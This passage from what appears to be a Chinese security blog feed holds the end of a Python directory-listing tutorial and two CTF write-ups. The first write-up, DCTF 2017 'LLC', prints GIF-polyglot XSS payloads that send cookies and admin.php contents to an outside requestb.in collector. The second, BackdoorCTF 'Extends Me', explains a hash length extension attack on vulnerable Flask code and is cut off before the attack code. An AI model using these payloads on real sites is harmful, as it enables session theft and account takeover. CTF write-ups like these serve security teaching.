class="string">'.\\scripts\\phpcms\\v960_fileupload_getshell.py'</span>, <span class="string">'.\\scripts\\phpcms\\v960_sqlinject_getpasswd.py'</span>, <span class="string">'.\\scripts\\phpcms\\__init__.py'</span>]</div></pre></td></tr></table></figure></p>
<h2 id="glob-iglob"><a href="#glob-iglob" class="headerlink" title="glob.iglob"></a>glob.iglob</h2><p>iglob返回一个能生成与glob()结果相同的迭代器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1  python 2.7.2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>glob.iglob(<span class="string">r"./*"</span>)</div><div class="line">&lt;generator object _iglob at <span class="number">0x00000096635ED150</span>&gt;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> glob.iglob(<span class="string">r"./*"</span>):</div><div class="line"><span class="meta">... </span>    print(i)</div><div class="line">...</div><div class="line">.\cmspoc.py</div><div class="line">.\data</div><div class="line">.\lib</div><div class="line">.\README.md</div><div class="line">.\scripts</div><div class="line">.\tty.gif</div><div class="line">.\ttyrecord</div></pre></td></tr></table></figure></p>
<h1 id="pathlib"><a href="#pathlib" class="headerlink" title="pathlib"></a>pathlib</h1><p>pathlib在python3.4及其之后版本中默认继承了，python3.3之前的版本需要通过pip进行安装。</p>
<p>打印出当前目录（<code>.</code>）下的文件夹与文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pathlib</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> p <span class="keyword">in</span> pathlib.Path(<span class="string">'.'</span>).iterdir():</div><div class="line"><span class="meta">... </span>    print(p)</div><div class="line">...</div><div class="line">.ftpconfig</div><div class="line">.git</div><div class="line">.gitignore</div><div class="line">cmspoc.py</div><div class="line">data</div><div class="line">lib</div><div class="line">README.md</div><div class="line">scripts</div><div class="line">tty.gif</div><div class="line">ttyrecord</div></pre></td></tr></table></figure></p>
<p>仅打印出当前目录（<code>.</code>）下的文件：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> p <span class="keyword">in</span> pathlib.Path(<span class="string">'.'</span>).iterdir():         </div><div class="line"><span class="meta">... </span>    <span class="keyword">if</span> p.is_file():                           </div><div class="line"><span class="meta">... </span>            print(p)                          </div><div class="line"><span class="meta">... </span>                                              </div><div class="line">.ftpconfig                                        </div><div class="line">.gitignore                                        </div><div class="line">cmspoc.py                                         </div><div class="line">README.md                                         </div><div class="line">tty.gif                                           </div><div class="line">ttyrecord                                         </div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[p <span class="keyword">for</span> p <span class="keyword">in</span> pathlib.Path(<span class="string">'.'</span>).iterdir() <span class="keyword">if</span> p.is_file()]</div><div class="line">[WindowsPath(<span class="string">'.ftpconfig'</span>), WindowsPath(<span class="string">'.gitignore'</span>), WindowsPath(<span class="string">'cmspoc.py'</span>), WindowsPath(<span class="string">'README.md'</span>), WindowsPath(<span class="string">'tty.gif'</span>), WindowsPath(<span class="string">'ttyrecord'</span>)]</div></pre></td></tr></table></figure></p>
<p>仅打印出当前目录（<code>.</code>）下的文件夹：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python 3.6.1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> p <span class="keyword">in</span> pathlib.Path(<span class="string">'.'</span>).iterdir():</div><div class="line"><span class="meta">... </span>    print(p)</div><div class="line">...</div><div class="line">.ftpconfig</div><div class="line">.git</div><div class="line">.gitignore</div><div class="line">cmspoc.py</div><div class="line">data</div><div class="line">lib</div><div class="line">README.md</div><div class="line">scripts</div><div class="line">tty.gif</div><div class="line">ttyrecord</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>[p <span class="keyword">for</span> p <span class="keyword">in</span> pathlib.Path(<span class="string">'.'</span>).iterdir() <span class="keyword">if</span> p.is_dir()]</div><div class="line">[WindowsPath(<span class="string">'.git'</span>), WindowsPath(<span class="string">'data'</span>), WindowsPath(<span class="string">'lib'</span>), WindowsPath(<span class="string">'scripts'</span>)]</div></pre></td></tr></table></figure></p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="http://www.diveintopython.net/file_handling/os_module.html" target="_blank" rel="external">diveintopython:Working with Directories </a></li>
<li><a href="https://stackoverflow.com/questions/3964681/find-all-files-in-a-directory-with-extension-txt-in-python" target="_blank" rel="external">stackoverflow:Find all files in a directory with extension .txt in Python</a></li>
<li><a href="https://stackoverflow.com/questions/2186525/use-a-glob-to-find-files-recursively-in-python" target="_blank" rel="external">stackoverflow:Use a Glob() to find files recursively in Python?</a></li>
<li><a href="https://stackoverflow.com/questions/120656/directory-listing-in-python" target="_blank" rel="external">stackoverflow:Directory listing in Python</a></li>
<li><a href="https://stackoverflow.com/questions/3207219/how-do-i-list-all-files-of-a-directory" target="_blank" rel="external">stackoverflow:How do I list all files of a directory?</a></li>
<li><a href="https://stackoverflow.com/questions/973473/getting-a-list-of-all-subdirectories-in-the-current-directory" target="_blank" rel="external">stackoverflow:Getting a list of all subdirectories in the current directory</a></li>
<li><a href="https://stackoverflow.com/questions/800197/how-to-get-all-of-the-immediate-subdirectories-in-python" target="_blank" rel="external">stackoverflow:How to get all of the immediate subdirectories in Python</a></li>
<li><a href="https://www.saltycrane.com/blog/2010/04/options-listing-files-directory-python/" target="_blank" rel="external">Options for listing the files in a directory with Python</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;测试环境：python 3.6.1  python 2.7.2&lt;br&gt;测试目录：&lt;a href=&quot;https://github.com/CHYbeta/cmsPoc&quot;&gt;cmspoc&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="技术杂谈" scheme="http://chybeta.github.io/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="python" scheme="http://chybeta.github.io/tags/python/"/>
    
      <category term="列目录" scheme="http://chybeta.github.io/tags/%E5%88%97%E7%9B%AE%E5%BD%95/"/>
    
      <category term="directory" scheme="http://chybeta.github.io/tags/directory/"/>
    
  </entry>
  
  <entry>
    <title>DCTF 2017-DCTF LLC-writeup</title>
    <link href="http://chybeta.github.io/2017/10/04/DCTF-2017-DCTF-LLC-writeup/"/>
    <id>http://chybeta.github.io/2017/10/04/DCTF-2017-DCTF-LLC-writeup/</id>
    <published>2017-10-04T00:38:47.000Z</published>
    <updated>2017-10-04T03:13:07.726Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传+XSS</p>
<a id="more"></a>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://llc.dctf-quals-17.def.camp/</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171004/1.png?raw=true" alt=""></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>有一个文件上传功能，允许上传jpg,png,gif文件，并且对上传文件的幻数进行了检查，仅仅修改上传的扩展名是没有用的。在完成上传后，会将上传的图片preview出来，也就是说我们知道上传的图片的具体位置。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171004/2.png?raw=true" alt=""></p>
<p>还有一个发送message的功能，结合题目的信息，以及csp头，估计这题是要考察xss：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171004/3.png?raw=true" alt=""></p>
<p>文件上传功能+XSS，可以参考一下这篇文章：<a href="https://brutelogic.com.br/blog/file-upload-xss/" target="_blank" rel="external">File Upload XSS</a></p>
<p>所以思路如下：</p>
<ol>
<li>上传一张包含xss-payload的gif，得到gif的地址。</li>
<li>构造message为<script src="xx.gif"></script></li>
<li>发送message，执行xss-payload。</li>
</ol>
<p>尝试获取一下Cookie，构造gif的paylaod如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GIF89a/*.*/=0;window.location=&quot;https://requestb.in/1hw0wip1?cookie=&quot;+escape(document.cookie);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171004/4.png?raw=true" alt=""></p>
<p>在message框里填上payload，gif的图像地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script src=&quot;https://llc.dctf-quals-17.def.camp/__f6d24a42ddee7772707acf41c841d585/temp.gif&quot;&gt;&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>submit后可以看到接受到的请求：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171004/6.png?raw=true" alt=""></p>
<p>得到的cookie是<code>USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C/SCRIPT%3E</code>，即<code>USERID=&lt;SCRIPT&gt;alert(&#39;XSS&#39;)&lt;/SCRIPT&gt;</code>。没啥帮助。</p>
<p>观察到Referer: <a href="https://llc.dctf-quals-17.def.camp//bot.php?id=8472，存在一个bot.php，直接访问只发现它引入了jquery.js.min。利用gif的xss尝试读取：" target="_blank" rel="external">https://llc.dctf-quals-17.def.camp//bot.php?id=8472，存在一个bot.php，直接访问只发现它引入了jquery.js.min。利用gif的xss尝试读取：</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GIF89a/*.*/=0;var ajax = new XMLHttpRequest();ajax.open(&quot;GET&quot;,&quot;bot.php&quot;,false);ajax.send();window.location=&quot;https://requestb.in/1hw0wip1?text=&quot;+btoa(ajax.responseText);</div></pre></td></tr></table></figure></p>
<p>同样没有用。</p>
<p>通过扫描器，可以扫出一个 admin.php，构造gif：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GIF89a/*.*/=0;var ajax = new XMLHttpRequest();ajax.open(&quot;GET&quot;,&quot;admin.php&quot;,false);ajax.send();window.location=&quot;https://requestb.in/1hw0wip1?text=&quot;+btoa(ajax.responseText);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171004/7.png?raw=true" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">RENURns4MDhmNTBjYTNmMzE4MmEzMGU3NmJiOWZjYzBmZGNiN2Y3NWY0Y2U1OTdmN2FiZTE3OTNlMzk0MmFjZjNlYzllfQ==</div></pre></td></tr></table></figure></p>
<p>base64解码后得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DCTF&#123;808f50ca3f3182a30e76bb9fcc0fdcb7f75f4ce597f7abe1793e3942acf3ec9e&#125;</div></pre></td></tr></table></figure></p>
<p>考虑到bot.php有引入jquery。所以gif的xsspayload也可以如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GIF89a/*.*/=0;$.get(&quot;admin.php&quot;,function(data)&#123;window.location=&quot;https://requestb.in/1hw0wip1?text=&quot;+btoa(data);&#125;);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171004/8.png?raw=true" alt=""></p>
<p>排版后的几段实际执行的payload:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">window</span>.location=<span class="string">"https://requestb.in/1hw0wip1?cookie="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</div></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ajax = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">ajax.open(<span class="string">"GET"</span>,<span class="string">"bot.php"</span>,<span class="literal">false</span>);</div><div class="line">ajax.send();</div><div class="line"><span class="built_in">window</span>.location=<span class="string">"https://requestb.in/1hw0wip1?text="</span>+btoa(ajax.responseText)</div></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$.get(<span class="string">"admin.php"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</div><div class="line">	<span class="built_in">window</span>.location=<span class="string">"https://requestb.in/1hw0wip1?text="</span>+btoa(data);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文件上传+XSS&lt;/p&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>BackdoorCTF 2017-Extends Me-writeup</title>
    <link href="http://chybeta.github.io/2017/09/28/BackdoorCTF-2017-Extends-Me-writeup/"/>
    <id>http://chybeta.github.io/2017/09/28/BackdoorCTF-2017-Extends-Me-writeup/</id>
    <published>2017-09-28T04:55:04.000Z</published>
    <updated>2017-09-29T07:41:40.992Z</updated>
    
    <content type="html"><![CDATA[<p>哈希长度扩展攻击 以及一种奇葩解法</p>
<p>已将该题收录至<a href="https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/python/challenge-1.md" target="_blank" rel="external">Code-Audit-Challenges-python:1</a><br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Extends Me</div><div class="line">https://extend-me-please.herokuapp.com/login</div></pre></td></tr></table></figure>
<p>页面打开如下:</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170928/1.png?raw=true" alt=""></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>题目提供了源码，如下：<br>server.py:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> hash <span class="keyword">import</span> SLHA1</div><div class="line">app = Flask(__name__)</div><div class="line"></div><div class="line">key = file(<span class="string">'SECRET'</span>).read().strip()</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">root</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</div><div class="line"></div><div class="line"><span class="meta">@app.route('/login',methods = ['GET', 'POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</div><div class="line">		<span class="keyword">if</span>  <span class="keyword">not</span> request.form.get(<span class="string">'username'</span>):</div><div class="line">			<span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			username = str(request.form.get(<span class="string">'username'</span>))</div><div class="line">			<span class="keyword">if</span> request.cookies.get(<span class="string">'data'</span>) <span class="keyword">and</span> request.cookies.get(<span class="string">'user'</span>):</div><div class="line">				data = str(request.cookies.get(<span class="string">'data'</span>)).decode(<span class="string">'base64'</span>).strip()</div><div class="line">				user = str(request.cookies.get(<span class="string">'user'</span>)).decode(<span class="string">'base64'</span>).strip()				</div><div class="line">				temp = <span class="string">'|'</span>.join([key,username,user])</div><div class="line">				<span class="keyword">if</span> data != SLHA1(temp).digest():</div><div class="line">					temp = SLHA1(temp).digest().encode(<span class="string">'base64'</span>).strip().replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line">					resp = make_response(render_template(<span class="string">'welcome_new.html'</span>,name = username))</div><div class="line">					resp.set_cookie(<span class="string">'user'</span>,<span class="string">'user'</span>.encode(<span class="string">'base64'</span>).strip())</div><div class="line">					resp.set_cookie(<span class="string">'data'</span>,temp)</div><div class="line">					<span class="keyword">return</span> resp</div><div class="line">				<span class="keyword">else</span>:</div><div class="line">					<span class="keyword">if</span> <span class="string">'admin'</span> <span class="keyword">in</span> user: <span class="comment"># too lazy to check properly :p</span></div><div class="line">						<span class="keyword">return</span> <span class="string">"Here you go : CTF&#123;XXXXXXXXXXXXXXXXXXXXXXXXX&#125;"</span></div><div class="line">					<span class="keyword">else</span>:</div><div class="line">						<span class="keyword">return</span> render_template(<span class="string">'welcome_back.html'</span>,name = username)</div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				resp = make_response(render_template(<span class="string">'welcome_new.html'</span>,name = username))</div><div class="line">				temp = <span class="string">'|'</span>.join([key,username,<span class="string">'user'</span>])</div><div class="line">				resp.set_cookie(<span class="string">'data'</span>,SLHA1(temp).digest().encode(<span class="string">'base64'</span>).strip().replace(<span class="string">'\n'</span>,<span class="string">''</span>))</div><div class="line">				resp.set_cookie(<span class="string">'user'</span>,<span class="string">'user'</span>.encode(<span class="string">'base64'</span>).strip())</div><div class="line">				<span class="keyword">return</span> resp</div><div class="line"></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</div><div class="line"></div><div class="line"><span class="meta">@app.route('/logout')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></div><div class="line">	resp = make_response(render_template(<span class="string">'login.html'</span>))</div><div class="line">	resp.set_cookie(<span class="string">'data'</span>,<span class="string">''</span>,expires=<span class="number">0</span>)</div><div class="line">	resp.set_cookie(<span class="string">'user'</span>,<span class="string">''</span>,expires=<span class="number">0</span>)</div><div class="line">	<span class="keyword">return</span> (resp)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">	app.run()</div></pre></td></tr></table></figure></p>
<p>还有hash.py，鉴于太长，这里就不贴出来了，可以见这：<a href="https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/python/challenge-1.md" target="_blank" rel="external">Code-Audit-Challenges-python:1</a></p>
<p>看一下server.py的流程，分为三个路由：</p>
<ol>
<li>根路径，会重定向到login</li>
<li>login页面，登陆后能拿到flag。</li>
<li>logout页面</li>
</ol>
<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>接下来细看<code>login()</code>，这里会啰嗦点尽量把整个流程解释清楚（其实都是废话）。</p>
<p>当我们在表单中输入用户名并提交后，server.py通过<code>str(request.form.get(&#39;username&#39;))</code>获取用户名并保存到变量username中。</p>
<p>接下来，如果在cookie中能获取到data和user字段，则接收并进行base64解码后去掉两边的空格之后存放到对应的变量data和user中：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">data = str(request.cookies.get(&apos;data&apos;)).decode(&apos;base64&apos;).strip()</div><div class="line">user = str(request.cookies.get(&apos;user&apos;)).decode(&apos;base64&apos;).strip()</div></pre></td></tr></table></figure></p>
<p>其中strip()的作用是去掉字符串头尾指定的字符，默认为空格。</p>
<p>接下来通过join操作，得到一个变量temp，其组成为<code>key|username|user</code>，其中username和user即前面提到的。而这个key是通过下面的语句定义的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">key = file(&apos;SECRET&apos;).read().strip()</div></pre></td></tr></table></figure></p>
<p>也就是说，变量key是未知的。</p>
<p>继续，截取server.py的代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> data != SLHA1(temp).digest():</div><div class="line">	temp = SLHA1(temp).digest().encode(<span class="string">'base64'</span>).strip().replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line">	resp = make_response(render_template(<span class="string">'welcome_new.html'</span>,name = username))</div><div class="line">	resp.set_cookie(<span class="string">'user'</span>,<span class="string">'user'</span>.encode(<span class="string">'base64'</span>).strip())</div><div class="line">	resp.set_cookie(<span class="string">'data'</span>,temp)</div><div class="line">	<span class="keyword">return</span> resp</div><div class="line"><span class="keyword">else</span>:</div><div class="line">	<span class="keyword">if</span> <span class="string">'admin'</span> <span class="keyword">in</span> user: <span class="comment"># too lazy to check properly :p</span></div><div class="line">		<span class="keyword">return</span> <span class="string">"Here you go : CTF&#123;XXXXXXXXXXXXXXXXXXXXXXXXX&#125;"</span></div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">return</span> render_template(<span class="string">'welcome_back.html'</span>,name = username)</div></pre></td></tr></table></figure></p>
<p>会进行一个data与SLHA1(temp)的比较，其中SLHA1(temp)的具体实现在<a href="(https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/python/challenge-1.md">hash.py</a>)中。如果比较相等且字符串<code>admin</code>在变量user中，则得到flag。注意这里是用<code>in</code>操作符，所以如下的情况是真的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; &apos;admin&apos; in &apos;userxxxxxxxxxadmin&apos;</div><div class="line">True</div></pre></td></tr></table></figure></p>
<p>如果比较不等，则会进行一个set_cookie操作，即我们会接受到以下的cookie:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user = base64encode(user)</div><div class="line">data = temp 即 data = SLHA1(key|username|user).digest().encode(&apos;base64&apos;).strip().replace(&apos;\n&apos;,&apos;&apos;)</div></pre></td></tr></table></figure></p>
<p>如果在cookie中不能能获取到data和user字段，它会执行下面的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">resp = make_response(render_template(<span class="string">'welcome_new.html'</span>,name = username))</div><div class="line">temp = <span class="string">'|'</span>.join([key,username,<span class="string">'user'</span>])</div><div class="line">resp.set_cookie(<span class="string">'data'</span>,SLHA1(temp).digest().encode(<span class="string">'base64'</span>).strip().replace(<span class="string">'\n'</span>,<span class="string">''</span>))</div><div class="line">resp.set_cookie(<span class="string">'user'</span>,<span class="string">'user'</span>.encode(<span class="string">'base64'</span>).strip())</div><div class="line"><span class="keyword">return</span> resp</div></pre></td></tr></table></figure></p>
<p>也是有一个set_cookie操作，我们会得到以下的cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">data = SLHA1(key|username|&apos;user&apos;).digest().encode(&apos;base64&apos;).strip().replace(&apos;\n&apos;,&apos;&apos;)</div><div class="line">user = base64encode(&apos;user&apos;)</div></pre></td></tr></table></figure></p>
<p>这里括号中的<code>&#39;user&#39;</code>是指定的字符串，跟前面我们通过cookie传入得到的user变量是不一样的。</p>
<p>接下来看看SLHA1函数，这个是模仿了<a href="https://github.com/ajalt/python-sha1" target="_blank" rel="external">SHA1加密</a>，对一些参数等做了修改，但本质上是基于<a href="https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction" target="_blank" rel="external">Merkle–Damgård construction</a>。所以我可以尝试一下哈希长度扩展攻击。</p>
<h2 id="法一：哈希长度扩展攻击"><a href="#法一：哈希长度扩展攻击" class="headerlink" title="法一：哈希长度扩展攻击"></a>法一：哈希长度扩展攻击</h2><p>基本的思路如下：</p>
<ol>
<li>先获取到cookie，其中data=SLHA1(key|xxx)，user=base64encode(‘user’)</li>
<li>基于第一步，通过哈希长度扩展攻击，得到SLHA1(key|xxx。。。admin)。</li>
<li>构造data，user字段，发送cookie，使之满足<code>data == SLHA1(temp).digest()</code></li>
</ol>
<p>第一步获取cookie：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170928/2.png?raw=true" alt=""><br>几个已知的参数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">username = &quot;chybeta&quot;</div><div class="line">data=&quot;GwgWlwVYqelmztYx1n//EfyTIU6cH8ab&quot;</div><div class="line">user=&quot;dXNlcg==&quot;</div><div class="line"></div><div class="line">base64decode(&quot;dXNlcg==&quot;) = &quot;user&quot;</div></pre></td></tr></table></figure></p>
<p>data由服务器端经过<code>SLHA1(&quot;xxxx|chybeta|user&quot;)</code>加密得到，括号里的都是字符串不是变量，xxxx表示key。</p>
<p>第二步，进行哈希长度扩展攻击。先看看目标，注意以下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> request.cookies.get(<span class="string">'data'</span>) <span class="keyword">and</span> request.cookies.get(<span class="string">'user'</span>):</div><div class="line">	data = str(request.cookies.get(<span class="string">'data'</span>)).decode(<span class="string">'base64'</span>).strip()</div><div class="line">	user = str(request.cookies.get(<span class="string">'user'</span>)).decode(<span class="string">'base64'</span>).strip()				</div><div class="line">	temp = <span class="string">'|'</span>.join([key,username,user])</div><div class="line">	<span class="keyword">if</span> data != SLHA1(temp).digest():</div></pre></td></tr></table></figure></p>
<p>要构造出<code>SLHA1(&quot;xxxx|chybeta|user&quot;+padding+&quot;admin&quot;)</code>，并将其设置为data。同时设置cookie中的user为base64encode(“user”+padding+”admin”)。即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">data = SLHA1(&quot;xxxx|chybeta|user&quot;+padding+&quot;admin&quot;)</div><div class="line">user = base64encode(&quot;user&quot;+padding+&quot;admin&quot;)</div></pre></td></tr></table></figure></p>
<p>这样服务器端的流程约莫如下：</p>
<ol>
<li>保持post传入的username仍为”chybeta”</li>
<li>data = str(request.cookies.get(‘data’)).decode(‘base64’).strip() 得到 data = SLHA1(“xxxx|chybeta|user”+padding+”admin”)</li>
<li>user = str(request.cookies.get(‘user’)).decode(‘base64’).strip() 得到 user = “user”+padding+”admin”</li>
<li>temp = ‘|’.join([key,username,user]) 得到 temp = “xxxx|chybeta|user”+padding+”admin”</li>
<li>判断 SLHA1(“xxxx|chybeta|user”+padding+”admin”) == SLHA1(“xxxx|chybeta|user”+padding+”admin”)</li>
</ol>
<p>因为出题者自己写了SLHA1，所以现成的工具是不行的。对照<a href="https://github.com/ajalt/python-sha1" target="_blank" rel="external">SHA1加密算法</a>，我们写一个对SLHA1的长度扩展攻击算法。</p>
